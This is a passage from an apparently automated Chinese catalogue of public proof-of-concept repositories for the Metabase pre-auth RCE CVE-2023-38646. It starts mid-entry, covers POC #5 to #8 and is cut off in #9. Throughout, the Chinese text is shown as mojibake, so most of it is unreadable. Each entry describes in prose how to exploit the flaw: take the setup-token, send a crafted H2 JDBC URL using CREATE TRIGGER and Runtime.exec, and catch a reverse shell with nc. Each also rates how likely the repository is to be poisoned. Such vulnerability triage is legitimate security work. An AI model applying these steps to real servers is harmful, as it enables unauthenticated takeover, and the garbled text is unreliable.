`CREATE ALIAS` åˆ›å»ºJavaå‡½æ•°,ä»è€Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚\n\n**æœ‰æ•ˆæ€§ï¼š** æä¾›çš„ PoC ä»£ç æ˜¯æœ‰æ•ˆçš„ï¼Œå®ƒèƒ½å¤Ÿåˆ©ç”¨è¯¥æ¼æ´åœ¨ Metabase å®ä¾‹ä¸Šæ‰§è¡Œä»»æ„ä»£ç ï¼Œå¦‚æœç›®æ ‡å®ä¾‹çš„ç‰ˆæœ¬ä½äºå—å½±å“çš„ç‰ˆæœ¬ã€‚\n\n**æŠ•æ¯’é£é™©ï¼š** é£é™©ä¸º10%ï¼Œä¸»è¦é£é™©åœ¨äº `exploit.py` æ–‡ä»¶ä¸­`YOUR_GITPOD_WORKSPACE_URL` å¦‚æœä¸æ˜¯æ”»å‡»è€…è‡ªå·±çš„æœåŠ¡å™¨ï¼Œå­˜åœ¨è¢«ä¸­é—´äººæ”»å‡»æ›¿æ¢è¿æ¥çš„é£é™©. è™½ç„¶`poc.sql`ç›®å‰ä»…ä»…æ˜¯ `SELECT 1;`ï¼Œ ä½†æ˜¯å¦‚æœæœ‰äººæ¶æ„ä¿®æ”¹`poc.sql`ï¼Œåˆ™å­˜åœ¨è¢«æŠ•æ¯’é£é™©ã€‚ start.shä¸­çš„metabase.jaræ¥æºå¯èƒ½è¢«ç¯¡æ”¹ï¼Œå­˜åœ¨è¢«æŠ•æ¯’é£é™©ã€‚

**é¡¹ç›®åœ°å€:** [BreezeGalaxy/CVE-2023-38646](https://github.com/BreezeGalaxy/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #5

**æ¥æº**: [CVE-2023-38646-CN016_Metabase-H2-CVE-2023-38646-.md](../2023/CVE-2023-38646-CN016_Metabase-H2-CVE-2023-38646-.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€èº«ä»½éªŒè¯å³å¯è¿œç¨‹æ‰§è¡Œä»»æ„ä»£ç 

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** MetabaseæœåŠ¡éœ€è¦å¯è®¿é—®ï¼Œæ— éœ€è®¤è¯

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šä»¥æœåŠ¡å™¨æƒé™çº§åˆ«æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ¼æ´å­˜åœ¨äºMetabaseçš„setupæµç¨‹ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨H2æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡æ„é€ æ¶æ„çš„JDBC URLæ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§:**
æä¾›çš„POCä»£ç çœ‹èµ·æ¥æœ‰æ•ˆã€‚å®ƒåŒ…å«ä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š
1.  è·å–setup-tokenï¼šPOCé¦–å…ˆå°è¯•ä»`/api/session/properties`è·å–setup-tokenã€‚è¿™æ˜¯åˆ©ç”¨æ¼æ´çš„å‰æã€‚ä»æ¼æ´ä¿¡æ¯æ¥çœ‹ï¼Œè¿™ä¸ªæ¥å£ä¸éœ€è¦èº«ä»½éªŒè¯ã€‚
2.  æ„é€ Payloadï¼šPOCæ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„JDBC URLçš„JSON payloadã€‚è¯¥URLåˆ©ç”¨H2æ•°æ®åº“çš„`CREATE TRIGGER`åŠŸèƒ½æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚å‘½ä»¤çš„æ‰§è¡Œæ˜¯é€šè¿‡è°ƒç”¨`java.lang.Runtime.getRuntime().exec()`å®ç°çš„ã€‚POCä¸­é»˜è®¤æ‰§è¡Œ`touch /tmp/success`ï¼Œè¿™æ˜¯ä¸€ä¸ªæ— å®³çš„å‘½ä»¤ï¼Œç”¨äºéªŒè¯æ¼æ´çš„å­˜åœ¨ã€‚
3.  å‘é€Payloadï¼šPOCå°†æ„é€ çš„payloadå‘é€åˆ°`/api/setup/validate`ç«¯ç‚¹ã€‚å¦‚æœæœåŠ¡å™¨è¿”å›åŒ…å«"Error creating or initializing trigger"çš„å“åº”ï¼Œåˆ™è¡¨æ˜æ¼æ´åˆ©ç”¨æˆåŠŸã€‚

**æŠ•æ¯’é£é™©:**
è™½ç„¶POCçš„ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´ï¼Œä½†å­˜åœ¨ä¸€äº›æ½œåœ¨çš„æŠ•æ¯’é£é™©ã€‚ä»¥ä¸‹æ˜¯åˆ†æï¼š
1. **`custom_base64_encode`å‡½æ•°:** è¿™ä¸ªå‡½æ•°å­˜åœ¨è¢«æ»¥ç”¨çš„å¯èƒ½ã€‚è™½ç„¶å…¶ç›®çš„æ˜¯å¯¹å‘½ä»¤è¿›è¡Œç¼–ç ï¼Œä½†å¦‚æœç”¨äºç¼–ç æ¶æ„è„šæœ¬å¹¶æ‰§è¡Œï¼Œåˆ™ä¼šäº§ç”Ÿå®‰å…¨é—®é¢˜ã€‚
2. **å‘½ä»¤æ‰§è¡Œ:** POCä¸­ä½¿ç”¨`java.lang.Runtime.getRuntime().exec()`æ‰§è¡Œå‘½ä»¤ã€‚è¿™æœ¬èº«å°±å¾ˆå±é™©ï¼Œå› ä¸ºæ”»å‡»è€…å¯ä»¥æ‰§è¡Œä»»ä½•å‘½ä»¤ï¼ŒåŒ…æ‹¬ä¸‹è½½å’Œæ‰§è¡Œæ¶æ„è„šæœ¬ã€‚
3. **é»˜è®¤å‘½ä»¤:** è™½ç„¶POCé»˜è®¤æ‰§è¡Œçš„æ˜¯`touch /tmp/success`ï¼Œä½†æ”»å‡»è€…å¯ä»¥å¾ˆå®¹æ˜“åœ°ä¿®æ”¹`-c`å‚æ•°æ¥æ‰§è¡Œä»»ä½•å…¶ä»–å‘½ä»¤ã€‚å¦‚æœPOCè¢«åˆ†å‘å¹¶è¢«ç¼ºä¹ç»éªŒçš„ç”¨æˆ·ä½¿ç”¨ï¼Œä»–ä»¬å¯èƒ½ä¼šç›´æ¥æ‰§è¡Œæ”»å‡»è€…æä¾›çš„æ¶æ„å‘½ä»¤ã€‚

ç»¼åˆæ¥çœ‹ï¼ŒæŠ•æ¯’é£é™©ä¸»è¦åœ¨äºä½¿ç”¨è€…å¯èƒ½å—åˆ°æ¶æ„å‘½ä»¤çš„å½±å“ã€‚`custom_base64_encode`å‡½æ•°å’Œå‘½ä»¤æ‰§è¡Œæœºåˆ¶ä¹Ÿä¸ºæ½œåœ¨çš„æ¶æ„è¡Œä¸ºæä¾›äº†å¯èƒ½æ€§ã€‚é£é™©è¯„ä¼°ä¸º 10%ï¼Œä¸»è¦æ¥æºäºä½¿ç”¨è€…æ²¡æœ‰å®‰å…¨æ„è¯†ï¼Œç›´æ¥æ‰§è¡Œäº†æ¶æ„å‘½ä»¤ï¼Œæˆ–è€…ä»£ç åº“çš„ä¸‹è½½æºè¢«æ›¿æ¢ã€‚

**åˆ©ç”¨æ–¹å¼:**
1.  æ”»å‡»è€…é¦–å…ˆå‘`/api/session/properties`å‘é€GETè¯·æ±‚ä»¥è·å–setup-tokenã€‚
2.  ç„¶åï¼Œæ”»å‡»è€…æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„JDBC URLçš„JSON payloadã€‚æ¶æ„JDBC URLåˆ©ç”¨H2æ•°æ®åº“çš„`CREATE TRIGGER`åŠŸèƒ½æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒåˆ›å»ºä¸€ä¸ªåœ¨`INFORMATION_SCHEMA.TABLES`ä¸Šè§¦å‘çš„triggerï¼Œå¹¶åœ¨è§¦å‘æ—¶æ‰§è¡ŒJavaä»£ç ã€‚Javaä»£ç è°ƒç”¨`java.lang.Runtime.getRuntime().exec()`æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚
3.  æ”»å‡»è€…å°†æ„é€ çš„payloadå‘é€åˆ°`/api/setup/validate`ç«¯ç‚¹ã€‚
4.  å¦‚æœæœåŠ¡å™¨æˆåŠŸåˆ›å»ºäº†triggerï¼Œåˆ™æ”»å‡»æˆåŠŸï¼Œæ”»å‡»è€…æ‰§è¡Œçš„å‘½ä»¤å°†åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [CN016/Metabase-H2-CVE-2023-38646-](https://github.com/CN016/Metabase-H2-CVE-2023-38646-)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #6

**æ¥æº**: [CVE-2023-38646-DaniTheHack3r_CVE-2023-38646.md](../2023/CVE-2023-38646-DaniTheHack3r_CVE-2023-38646.md)

## CVE-2023-38646 Metabase RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯å³å¯æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** Metabase open source < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯ç½‘ç»œè®¿é—®ï¼Œä¸”ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œæ­¤æ¼æ´çš„ä¸¥é‡ç¨‹åº¦ä¸ºé«˜å±ï¼Œå› ä¸ºæ”»å‡»è€…å¯ä»¥å®Œå…¨æ§åˆ¶å—å½±å“çš„æœåŠ¡å™¨ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å– Token:** POCä»£ç é¦–å…ˆå°è¯•ä» `[TARGET_URL]/api/session/properties` è·å– setup-tokenã€‚
2.  **æ„é€  Payload:** åˆ©ç”¨è·å–åˆ°çš„tokenï¼ŒPOCæ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ payloadã€‚è¯¥å­—ç¬¦ä¸²ä¸­åŒ…å«å¯æ‰§è¡Œå‘½ä»¤ï¼ˆé€šè¿‡ `COMMAND` å‚æ•°ä¼ å…¥ï¼‰ï¼Œé€šå¸¸é€šè¿‡ Base64 ç¼–ç è¿›è¡Œæ··æ·†ã€‚
3.  **å‘é€ Payload:** æ„é€ å¥½çš„payloadä¼šè¢«å‘é€åˆ° Metabase æœåŠ¡å™¨ï¼Œåˆ©ç”¨å…¶å¯¹æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²å¤„ç†ä¸å½“çš„æ¼æ´ï¼Œæ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„å‘½ä»¤ã€‚
4.  **å‘½ä»¤æ‰§è¡Œ:**  é€šè¿‡åˆ›å»ºè§¦å‘å™¨å’Œåˆ©ç”¨H2æ•°æ®åº“ç‰¹æ€§ï¼Œå®ç°åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**

æ ¹æ®æ¼æ´æè¿°ã€æœç´¢å¼•æ“ç»“æœï¼ˆä¾‹å¦‚ï¼Œ[https://www.assetnote.io/resources/research/chaining-our-way-to-pre-auth-rce-in-metabase-cve-2023-38646/](https://www.assetnote.io/resources/research/chaining-our-way-to-pre-auth-rce-in-metabase-cve-2023-38646/) ï¼‰å’ŒPOCä»£ç ï¼Œæ­¤æ¼æ´åˆ©ç”¨çš„æœ‰æ•ˆæ€§è¾ƒé«˜ã€‚å¤šä¸ªæ¥æºè¡¨æ˜ï¼Œè¯¥æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°ï¼š**

POCä»£ç ä¸­å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ã€‚è™½ç„¶ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´æ‰§è¡Œå‘½ä»¤ï¼Œä½†ä»£ç ä¸­å­˜åœ¨ä»¥ä¸‹æ½œåœ¨çš„é£é™©ç‚¹ï¼š

*   **è‡ªå®šä¹‰ Base64 ç¼–ç :**  `CustomBase64Encode` å‡½æ•°ä½¿ç”¨è‡ªå®šä¹‰çš„ Base64 ç¼–ç æ–¹å¼ï¼Œè™½ç„¶ç›®çš„æ˜¯ä¸ºäº†ç¬¦åˆæ¼æ´åˆ©ç”¨çš„è¦æ±‚ï¼Œä½†ä¹Ÿå¯èƒ½è¢«ç”¨æ¥éšè—æ¶æ„ä»£ç ã€‚
*   **Payload æ„é€ :** Payloadçš„æ„é€ è¿‡ç¨‹æ¯”è¾ƒå¤æ‚ï¼Œæ”»å‡»è€…å¯èƒ½åœ¨payloadä¸­åµŒå…¥é¢å¤–çš„æ¶æ„ä»£ç ï¼Œä¾‹å¦‚ï¼Œåœ¨è¿æ¥å­—ç¬¦ä¸²ä¸­æ·»åŠ é¢å¤–çš„å‚æ•°ï¼Œä»¥ä¾¿åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œã€‚
*   **ä»£ç†è®¾ç½®:** æ¶æ„æ”»å‡»è€…å¯èƒ½ä¼šé€šè¿‡ä»£ç†æœåŠ¡å™¨å‘èµ·æ”»å‡», ä»è€Œéšè—è‡ªå·±çš„èº«ä»½ä¿¡æ¯.

å°½ç®¡å¦‚æ­¤ï¼Œæ ¹æ®ä»£ç æœ¬èº«ï¼Œå¤§éƒ¨åˆ†ä»£ç æ˜¯ç”¨äºå®ç°æ¼æ´åˆ©ç”¨åŠŸèƒ½çš„ï¼ŒæŠ•æ¯’çš„å¯èƒ½æ€§ç›¸å¯¹è¾ƒä½ï¼Œä¼°è®¡åœ¨10%å·¦å³ã€‚éœ€è¦äººå·¥å®¡æ ¸Payloadæ„é€ éƒ¨åˆ†ã€‚


**é¡¹ç›®åœ°å€:** [DaniTheHack3r/CVE-2023-38646](https://github.com/DaniTheHack3r/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #7

**æ¥æº**: [CVE-2023-38646-Ego1stoo_CVE-2023-38646.md](../2023/CVE-2023-38646-Ego1stoo_CVE-2023-38646.md)

## CVE-2023-38646 Metabase Pre-Auth RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source before 0.46.6.1 å’Œ Metabase Enterprise before 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ Metabase å®ä¾‹éœ€è¦è¿è¡Œåœ¨å—å½±å“çš„ç‰ˆæœ¬èŒƒå›´å†…ï¼Œå¹¶ä¸”æ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡ç½‘ç»œè®¿é—®åˆ°è¯¥å®ä¾‹ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ¼æ´çš„åˆ©ç”¨æ–¹å¼å¦‚ä¸‹ï¼š

1.  **æ¼æ´åŸç†ï¼š** Metabase å­˜åœ¨ä¸€ä¸ªæœªæˆæƒçš„ `/api/setup/validate` æ¥å£ï¼Œè¯¥æ¥å£ç”¨äºåœ¨ Metabase é¦–æ¬¡è®¾ç½®æ—¶éªŒè¯æ•°æ®åº“è¿æ¥ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¥å£ï¼Œé€šè¿‡æ„é€ æ¶æ„çš„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚
2.  **åˆ©ç”¨æ­¥éª¤ï¼š**
    *   é¦–å…ˆï¼Œæ”»å‡»è€…è®¿é—® Metabase å®ä¾‹çš„æ ¹è·¯å¾„ï¼Œè·å– `setup-token`ã€‚è¿™ä¸ªtokenè¢«åµŒå…¥åœ¨HTMLå“åº”çš„JavaScriptä»£ç ä¸­ï¼Œç”¨äºåç»­çš„è®¾ç½®è¿‡ç¨‹ã€‚
    *   ç„¶åï¼Œæ”»å‡»è€…å‘ `/api/setup/validate` æ¥å£å‘é€ POST è¯·æ±‚ï¼Œè¯·æ±‚ä½“åŒ…å«ä¸€ä¸ªæ¶æ„çš„ JSON å¯¹è±¡ã€‚è¿™ä¸ª JSON å¯¹è±¡çš„ `details.details.db` å­—æ®µåŒ…å«ä¸€ä¸ªç‰¹åˆ¶çš„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ã€‚è¿™ä¸ªè¿æ¥å­—ç¬¦ä¸²ä¸­åµŒå…¥äº†æ¶æ„ä»£ç ï¼Œåˆ©ç”¨ H2 æ•°æ®åº“çš„ `TRACE_LEVEL_SYSTEM_OUT` å’Œ `CREATE TRIGGER` åŠŸèƒ½æ¥æ‰§è¡Œä»»æ„çš„ shell å‘½ä»¤ã€‚
    *   POCä»£ç æ„é€ äº†ä¸€ä¸ªåå¼¹shellçš„payloadï¼Œå°†ç›®æ ‡æœºå™¨ä¸Šçš„è¾“å…¥è¾“å‡ºé‡å®šå‘åˆ°æ”»å‡»è€…æ§åˆ¶çš„æœºå™¨ä¸Šï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
3.  **æŠ•æ¯’é£é™©åˆ†æï¼š**
    è™½ç„¶æä¾›çš„ä»£ç ä¸»è¦æ˜¯ç”¨äºæ¼æ´åˆ©ç”¨ï¼Œä½†ä»å­˜åœ¨è½»å¾®çš„æŠ•æ¯’é£é™©ã€‚é£é™©ç‚¹ä¸»è¦å­˜åœ¨äº`CVE-2023-38646.py`è„šæœ¬ä¸­çš„`payload`å˜é‡ã€‚å½“å‰çš„`payload`ç”¨äºåˆ›å»ºä¸€ä¸ªåå‘shellè¿æ¥ï¼Œè™½ç„¶æœ¬èº«ä¸æ˜¯æ¶æ„ä»£ç ï¼Œä½†å¯èƒ½è¢«ä¿®æ”¹ä¸ºæ‰§è¡Œæ›´å…·ç ´åæ€§çš„æ“ä½œã€‚å¦å¤–ï¼Œä½œè€…æä¾›çš„githubé“¾æ¥ä¸­çš„å›¾ç‰‡å¯èƒ½æ˜¯ç»è¿‡ä¿®æ”¹çš„ã€‚
    æ€»ä½“è€Œè¨€ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œä½†éœ€è¦ä»”ç»†å®¡æŸ¥ä»£ç ï¼Œç¡®ä¿å…¶æ²¡æœ‰è¢«ç¯¡æ”¹æˆ–æ·»åŠ æ¶æ„åŠŸèƒ½ã€‚


**é¡¹ç›®åœ°å€:** [Ego1stoo/CVE-2023-38646](https://github.com/Ego1stoo/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #8

**æ¥æº**: [CVE-2023-38646-JayRyz_CVE-2023-38646-PoC-Metabase.md](../2023/CVE-2023-38646-JayRyz_CVE-2023-38646-PoC-Metabase.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹è¿è¡Œåœ¨å—å½±å“ç‰ˆæœ¬ï¼Œä¸”ç½‘ç»œå¯è¾¾ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨MetabaseæœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œæ­¤æ¼æ´å½±å“Metabaseå¼€æºç‰ˆæœ¬ä½äº0.46.6.1å’ŒMetabaseä¼ä¸šç‰ˆæœ¬ä½äº1.46.6.1ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å–Setup Tokenï¼š** åˆ©ç”¨ PoC ä»£ç ä¸­çš„ `get_token` å‡½æ•°ï¼Œé€šè¿‡è®¿é—® `/api/session/properties` æ¥å£è·å– setup-tokenã€‚
2.  **æ„é€ æ¶æ„Payloadï¼š** åˆ©ç”¨è·å–çš„ setup-token, æ„é€ åŒ…å«æ¶æ„å‘½ä»¤çš„payloadã€‚PoC ä»£ç ä½¿ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ä¸­åµŒå…¥æ¶æ„ SQL è¯­å¥ï¼Œè¯¥è¯­å¥åˆ›å»ºä¸€ä¸ªè§¦å‘å™¨ï¼ˆTRIGGERï¼‰ï¼Œåœ¨è§¦å‘å™¨ä¸­æ‰§è¡Œå‘½ä»¤ã€‚å‘½ä»¤ä½¿ç”¨äº†åå¼¹shellçš„æŠ€æœ¯ã€‚ é¦–å…ˆå°†è¦æ‰§è¡Œçš„shellå‘½ä»¤è¿›è¡Œbase64ç¼–ç , ç„¶ååˆ©ç”¨`java.lang.Runtime.getRuntime().exec()` æ¥æ‰§è¡Œå‘½ä»¤ã€‚
3.  **å‘é€Exploitï¼š** é€šè¿‡ POST è¯·æ±‚å°†æ„é€ çš„ payload å‘é€åˆ° Metabase æœåŠ¡å™¨ã€‚
4.  **åå¼¹ Shellï¼š** æ”»å‡»è€…ä½¿ç”¨ `nc` ç›‘å¬æŒ‡å®šç«¯å£ï¼Œç­‰å¾…ç›®æ ‡æœåŠ¡å™¨æ‰§è¡Œå‘½ä»¤ååå¼¹ shellã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æä¾›çš„æ¼æ´ä¿¡æ¯å’ŒPoCä»£ç ï¼Œæ­¤æ¼æ´çš„åˆ©ç”¨æ˜¯æœ‰æ•ˆçš„ã€‚æ¼æ´åº“ä¿¡æ¯æ˜ç¡®æŒ‡å‡ºæ— éœ€èº«ä»½éªŒè¯å³å¯åˆ©ç”¨æ­¤æ¼æ´æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æœç´¢å¼•æ“ç»“æœä¸­ä¹ŸåŒ…å«å¤§é‡å…³äºæ­¤æ¼æ´çš„åˆ†æå’Œåˆ©ç”¨æ–‡ç« ï¼Œè¿›ä¸€æ­¥éªŒè¯äº†å…¶æœ‰æ•ˆæ€§ã€‚PoCä»£ç æä¾›äº†è‡ªåŠ¨åŒ–åˆ©ç”¨çš„è„šæœ¬ã€‚

**æŠ•æ¯’é£é™©ï¼š**

æä¾›çš„ PoC ä»£ç ä¸­å­˜åœ¨æ½œåœ¨çš„æŠ•æ¯’é£é™©ã€‚è™½ç„¶ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´ï¼Œä½†ä»£ç ä¸­å¯èƒ½åŒ…å«ä»¥ä¸‹æ½œåœ¨é£é™©ï¼š

*   **åå¼¹ Shell åœ°å€ï¼š** PoC ä»£ç å…è®¸ç”¨æˆ·æŒ‡å®šåå¼¹ shell çš„ IP åœ°å€å’Œç«¯å£ï¼Œä½†å¦‚æœç”¨æˆ·ä¸å°å¿ƒä½¿ç”¨äº†æ”»å‡»è€…æ§åˆ¶çš„ IP åœ°å€å’Œç«¯å£ï¼Œå¯èƒ½ä¼šè¢«åå¼¹ shellï¼Œå¯¼è‡´è‡ªèº«ç³»ç»Ÿè¢«æ”»å‡»è€…æ§åˆ¶ã€‚
*   **å…¶ä»–æ¶æ„å‘½ä»¤ï¼š**  æ”»å‡»è€…å¯èƒ½ä¼šä¿®æ”¹ PoC ä»£ç ï¼Œæ·»åŠ é¢å¤–çš„æ¶æ„å‘½ä»¤ï¼Œä¾‹å¦‚åˆ é™¤æ–‡ä»¶ã€ä¿®æ”¹ç³»ç»Ÿé…ç½®ç­‰ã€‚ä»£ç ä¸­çš„`convert_command`å‡½æ•°å’Œ`create_payload`å‡½æ•°å¯ä»¥è¢«ä¿®æ”¹æ³¨å…¥æ¶æ„ä»£ç ã€‚
*   **ä¾èµ–é¡¹é£é™©ï¼š** è™½ç„¶PoCä»£ç ä¾èµ–çš„requestsåº“æœ¬èº«é£é™©è¾ƒä½ï¼Œä½†æ˜¯å¦‚æœæ”»å‡»è€…æä¾›ä¿®æ”¹è¿‡çš„poc,å¢åŠ å…¶ä»–æ¶æ„ä¾èµ–åº“, å¯èƒ½ä¼šå­˜åœ¨å®‰å…¨é£é™©ã€‚

ç»¼åˆåˆ†æï¼ŒæŠ•æ¯’é£é™©è¯„ä¼°ä¸º 10%ï¼Œä¸»è¦é£é™©é›†ä¸­åœ¨ç”¨æˆ·é”™è¯¯ä½¿ç”¨æˆ–æ¶æ„ä¿®æ”¹ PoC ä»£ç çš„å¯èƒ½æ€§ä¸Šã€‚

**é¡¹ç›®åœ°å€:** [JayRyz/CVE-2023-38646-PoC-Metabase](https://github.com/JayRyz/CVE-2023-38646-PoC-Metabase)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #9

**æ¥æº**: [CVE-2023-38646-Mrunalkaran_CVE-2023-38646.md](../2023/CVE-2023-38646-Mrunalkaran_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…ä»¥æœåŠ¡å™¨æƒé™æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** Metabase open source versions before 0.46.6.1 and Metabase Enterprise versions before 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹è¿è¡Œåœ¨å—å½±å“çš„ç‰ˆæœ¬ï¼Œä¸”ç½‘ç»œå¯è¾¾ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

CVE-2023-38646æ˜¯ä¸€ä¸ªå­˜åœ¨äºMetabase 0.46.6.1ä¹‹å‰ç‰ˆæœ¬å’ŒMetabase Enterprise 1.46.6.1ä¹‹å‰ç‰ˆæœ¬çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ”»å‡»è€…æ— éœ€èº«ä»½éªŒè¯å³å¯åˆ©ç”¨æ­¤æ¼æ´ï¼Œé€šè¿‡ç²¾å¿ƒæ„é€ çš„è¯·æ±‚ï¼Œåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œä»è€Œå®Œå…¨æ§åˆ¶ç³»ç»Ÿã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å–Setup Token:** POCè„šæœ¬é¦–å…ˆå°è¯•ä»`/api/session/properties`ç«¯ç‚¹è·å–setup-tokenï¼Œè¿™ä¸ªtokenç”¨äºåç»­çš„åˆ©ç”¨ã€‚
